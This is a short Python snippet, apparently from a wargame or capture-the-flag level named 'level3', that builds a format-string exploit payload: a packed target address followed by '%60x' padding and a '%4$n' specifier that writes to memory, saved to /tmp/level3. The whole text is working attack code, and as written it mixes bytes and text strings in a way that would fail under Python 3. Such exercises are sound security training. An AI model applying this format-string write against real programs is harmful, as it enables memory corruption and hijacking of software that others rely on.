payload = b"\x8c\x98\x04\x08"
payload += "%60x"
payload += "%4$n"

with open('/tmp/level3', 'wb') as f:
    f.write(payload)
